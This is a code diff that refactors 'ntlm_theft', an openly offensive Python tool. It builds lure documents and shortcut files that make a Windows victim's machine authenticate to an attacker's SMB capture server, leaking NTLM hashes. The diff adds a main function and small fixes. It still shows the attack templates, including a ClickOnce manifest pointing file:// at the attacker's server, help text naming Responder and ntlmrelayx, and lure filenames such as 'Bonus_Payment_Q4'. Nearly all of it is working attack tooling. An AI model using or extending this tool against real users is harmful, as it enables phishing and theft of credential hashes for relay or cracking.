@@ -1,4 +1,4 @@
-#!/usr/bin/env 
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 from __future__ import print_function
 
@@ -36,44 +36,45 @@ script_directory = os.path.dirname(os.path.abspath(__file__))
 
 #arg parser to generate all or one file
 #python ntlm_theft --generate all --ip 127.0.0.1 --filename board-meeting2020
-parser = argparse.ArgumentParser(
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        description='ntlm_theft by Jacob Wilkin(Greenwolf)',
-        usage='%(prog)s --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>')
-parser.add_argument('-v', '--version', action='version',
-    version='%(prog)s 0.1.0 : ntlm_theft by Jacob Wilkin(Greenwolf)')
-parser.add_argument('-vv', '--verbose', action='store_true',dest='vv',help='Verbose Mode')
-parser.add_argument('-g', '--generate',
-	action='store', 
-	dest='generate',
-	required=True,
-	choices=set((
-		"modern",
-		"all",
-		"scf",
-		"url",
-		"lnk",
-		"rtf",
-		"xml",
-		"htm",
-		"docx",
-		"xlsx",
-		"wax",		
-		"m3u",
-		"asx",
-		"jnlp",
-		"application",
-		"pdf",
-		"zoom",
-		"libraryms",
-		"autoruninf",
-		"desktopini")),
-    help='Choose to generate all files or a specific filetype')
-parser.add_argument('-s', '--server',action='store', dest='server',required=True,
-    help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)')
-parser.add_argument('-f', '--filename',action='store', dest='filename',required=True,
-    help='The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)')
-args = parser.parse_args()
+def build_parser():
+    parser = argparse.ArgumentParser(
+            formatter_class=argparse.RawDescriptionHelpFormatter,
+            description='ntlm_theft by Jacob Wilkin(Greenwolf)',
+            usage='%(prog)s --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>')
+    parser.add_argument('-v', '--version', action='version',
+        version='%(prog)s 0.1.0 : ntlm_theft by Jacob Wilkin(Greenwolf)')
+    parser.add_argument('-vv', '--verbose', action='store_true',dest='vv',help='Verbose Mode')
+    parser.add_argument('-g', '--generate',
+        action='store',
+        dest='generate',
+        required=True,
+        choices=set((
+            "modern",
+            "all",
+            "scf",
+            "url",
+            "lnk",
+            "rtf",
+            "xml",
+            "htm",
+            "docx",
+            "xlsx",
+            "wax",
+            "m3u",
+            "asx",
+            "jnlp",
+            "application",
+            "pdf",
+            "zoom",
+            "libraryms",
+            "autoruninf",
+            "desktopini")),
+        help='Choose to generate all files or a specific filetype')
+    parser.add_argument('-s', '--server',action='store', dest='server',required=True,
+        help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)')
+    parser.add_argument('-f', '--filename',action='store', dest='filename',required=True,
+        help='The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)')
+    return parser
 
 
 # NOT WORKING ON LATEST WINDOWS
@@ -134,7 +135,7 @@ def create_xml(generate,server,filename):
 # .xml with remote includepicture field attack
 # Filename: shareattack.xml, action=open, attacks=word
 def create_xml_includepicture(generate,server, filename):
-	documentfilename = os.path.join(script_directory,"templates", "includepicture-template.xml") 
+	documentfilename = os.path.join(script_directory,"templates", "includepicture-template.xml")
 	# Read the template file
 	file = open(documentfilename, 'r', encoding="utf8")
 	filedata = file.read()
@@ -173,13 +174,13 @@ def create_htm_handler(generate,server,filename):
 
 # .docx file with remote includepicture field attack
 def create_docx_includepicture(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-includepicture-template") 
-	# Destination path  
+	# Source path
+	src = os.path.join(script_directory,"templates", "docx-includepicture-template")
+	# Destination path
 	dest = os.path.join("docx-includepicture-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
+	# Copy the content of
+	# source to destination
+	shutil.copytree(src, dest)
 	documentfilename = os.path.join("docx-includepicture-template", "word", "_rels", "document.xml.rels")
 	# Read the template file
 	file = open(documentfilename, 'r')
@@ -200,13 +201,13 @@ def create_docx_includepicture(generate,server,filename):
 # Filename: shareattack.docx (unzip and put inside word\_rels\settings.xml.rels), action=open, attacks=word
 # Instructions: Word > Create New Document > Choose a Template > Unzip docx, change target in word\_rels\settings.xml.rels change target to smb server
 def create_docx_remote_template(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-remotetemplate-template") 
-	# Destination path  
+	# Source path
+	src = os.path.join(script_directory,"templates", "docx-remotetemplate-template")
+	# Destination path
 	dest = os.path.join("docx-remotetemplate-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
+	# Copy the content of
+	# source to destination
+	shutil.copytree(src, dest)
 	documentfilename = os.path.join("docx-remotetemplate-template", "word", "_rels", "settings.xml.rels")
 	# Read the template file
 	file = open(documentfilename, 'r')
@@ -225,13 +226,13 @@ def create_docx_remote_template(generate,server,filename):
 
 # .docx file with Frameset attack
 def create_docx_frameset(generate,server,filename):
-	# Source path  
-	src = os.path.join(script_directory,"templates", "docx-frameset-template") 
-	# Destination path  
+	# Source path
+	src = os.path.join(script_directory,"templates", "docx-frameset-template")
+	# Destination path
 	dest = os.path.join("docx-frameset-template")
-	# Copy the content of  
-	# source to destination  
-	shutil.copytree(src, dest)  
+	# Copy the content of
+	# source to destination
+	shutil.copytree(src, dest)
 	documentfilename = os.path.join("docx-frameset-template", "word", "_rels", "webSettings.xml.rels")
 	# Read the template file
 	file = open(documentfilename, 'r')
@@ -309,21 +310,21 @@ def create_application(generate,server,filename):
 	file = open(filename,'w')
 	file.write('''<?xml version="1.0" encoding="utf-8"?>
 <asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
-   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
-   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
-   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
-   <dependency>
-      <dependentAssembly dependencyType="install" codebase="file://''' + server + '''/leak/Leak.exe.manifest" size="32909">
-         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
-         <hash>
-            <dsig:Transforms>
-               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
-            </dsig:Transforms>
-            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
-            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
-         </hash>
-      </dependentAssembly>
-   </dependency>
+   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
+   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
+   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
+   <dependency>
+      <dependentAssembly dependencyType="install" codebase="file://''' + server + '''/leak/Leak.exe.manifest" size="32909">
+         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
+         <hash>
+            <dsig:Transforms>
+               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
+            </dsig:Transforms>
+            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
+            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
+         </hash>
+      </dependentAssembly>
+   </dependency>
 </asmv1:assembly>''')
 	file.close()
 	print("Created: " + filename + " (DOWNLOAD AND OPEN)")
@@ -552,117 +553,124 @@ def create_lnk(generate,server,filename):
 	print("Created: " + filename + " (BROWSE TO FOLDER)")
 
 
-# create folder to hold templates, if already exists delete it
-if os.path.exists(args.filename):
-	if input(f"Are you sure to want to delete {args.filename}? [Y/N]").lower not in ["y", "yes"]:
-		exit(0)
-	shutil.rmtree(args.filename)
-os.makedirs(args.filename)
+def main():
+    args = build_parser().parse_args()
 
-# handle which documents to create
-if (args.generate == "all" or args.generate == "modern"):
-	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))
+    # create folder to hold templates, if already exists delete it
+    if os.path.exists(args.filename):
+        if input(f"Are you sure to want to delete {args.filename}? [Y/N]").lower() not in ["y", "yes"]:
+            exit(0)
+        shutil.rmtree(args.filename)
+    os.makedirs(args.filename)
 
-	create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
-	create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))
+    # handle which documents to create
+    if (args.generate == "all" or args.generate == "modern"):
+        create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))
 
-	create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))
+        create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
+        create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))
 
-	create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))
+        create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))
 
-	create_xml(args.generate, args.server, os.path.join(args.filename, args.filename + "-(stylesheet).xml"))
-	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))
+        create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))
 
-	create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))
-	create_htm_handler(args.generate, args.server, os.path.join(args.filename, args.filename + "-(handler).htm"))
+        create_xml(args.generate, args.server, os.path.join(args.filename, args.filename + "-(stylesheet).xml"))
+        create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))
 
-	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
-	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
-	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))
+        create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))
+        create_htm_handler(args.generate, args.server, os.path.join(args.filename, args.filename + "-(handler).htm"))
 
-	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
+        create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
+        create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
+        create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))
 
-	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))
+        create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
 
-	create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))
+        create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))
 
-	create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))
+        create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))
 
-	create_jnlp(args.generate, args.server, os.path.join(args.filename, args.filename + ".jnlp"))
+        create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))
 
-	create_application(args.generate, args.server, os.path.join(args.filename, args.filename + ".application"))
+        create_jnlp(args.generate, args.server, os.path.join(args.filename, args.filename + ".jnlp"))
 
-	create_pdf(args.generate, args.server, os.path.join(args.filename, args.filename + ".pdf"))
+        create_application(args.generate, args.server, os.path.join(args.filename, args.filename + ".application"))
 
-	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))
+        create_pdf(args.generate, args.server, os.path.join(args.filename, args.filename + ".pdf"))
 
-	create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))
+        create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))
 
-	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))
+        create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))
 
-	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))
+        create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))
 
-	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
+        create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))
 
-elif(args.generate == "scf"):
-	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))
+        create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
 
-elif(args.generate == "url"):
-	create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
-	create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))
+    elif(args.generate == "scf"):
+        create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))
 
-elif(args.generate == "lnk"):
-	create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))
+    elif(args.generate == "url"):
+        create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
+        create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))
 
-elif(args.generate == "rtf"):
-	create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))
+    elif(args.generate == "lnk"):
+        create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))
 
-elif(args.generate == "xml"):
-	create_xml(args.generate, args.server, os.path.join(args.filename, args.filename + "-(stylesheet).xml"))
-	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))
+    elif(args.generate == "rtf"):
+        create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))
 
-elif(args.generate == "htm"):
-	create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))
+    elif(args.generate == "xml"):
+        create_xml(args.generate, args.server, os.path.join(args.filename, args.filename + "-(stylesheet).xml"))
+        create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))
 
-elif(args.generate == "docx"):
-	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
-	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
-	create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))
+    elif(args.generate == "htm"):
+        create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))
 
-elif(args.generate == "xlsx"):
-	create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
-	
-elif(args.generate == "wax"):
-	create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))
+    elif(args.generate == "docx"):
+        create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
+        create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
+        create_docx_frameset(args.generate, args.server, os.path.join(args.filename, args.filename + "-(frameset).docx"))
 
-elif(args.generate == "m3u"):
-	create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))
+    elif(args.generate == "xlsx"):
+        create_xlsx_externalcell(args.generate, args.server, os.path.join(args.filename, args.filename + "-(externalcell).xlsx"))
 
-elif(args.generate == "asx"):
-	create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))
+    elif(args.generate == "wax"):
+        create_wax(args.generate, args.server, os.path.join(args.filename, args.filename + ".wax"))
 
-elif(args.generate == "jnlp"):
-	create_jnlp(args.generate, args.server, os.path.join(args.filename, args.filename + ".jnlp"))
+    elif(args.generate == "m3u"):
+        create_m3u(args.generate, args.server, os.path.join(args.filename, args.filename + ".m3u"))
 
-elif(args.generate == "application"):
-	create_application(args.generate, args.server, os.path.join(args.filename, args.filename + ".application"))
+    elif(args.generate == "asx"):
+        create_asx(args.generate, args.server, os.path.join(args.filename, args.filename + ".asx"))
 
-elif(args.generate == "pdf"):
-	create_pdf(args.generate, args.server, os.path.join(args.filename, args.filename + ".pdf"))
+    elif(args.generate == "jnlp"):
+        create_jnlp(args.generate, args.server, os.path.join(args.filename, args.filename + ".jnlp"))
 
-elif(args.generate == "zoom"):
-	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))
+    elif(args.generate == "application"):
+        create_application(args.generate, args.server, os.path.join(args.filename, args.filename + ".application"))
 
-elif(args.generate == "libraryms"):
-	create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))
+    elif(args.generate == "pdf"):
+        create_pdf(args.generate, args.server, os.path.join(args.filename, args.filename + ".pdf"))
 
-elif(args.generate == "autoruninf"):
-	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))
+    elif(args.generate == "zoom"):
+        create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))
 
-elif(args.generate == "desktopini"):
-	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))
+    elif(args.generate == "libraryms"):
+        create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))
 
-elif(args.generate == "theme"):
-	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
+    elif(args.generate == "autoruninf"):
+        create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))
 
-print("Generation Complete.")
+    elif(args.generate == "desktopini"):
+        create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))
+
+    elif(args.generate == "theme"):
+        create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
+
+    print("Generation Complete.")
+
+
+if __name__ == "__main__":
+    main()
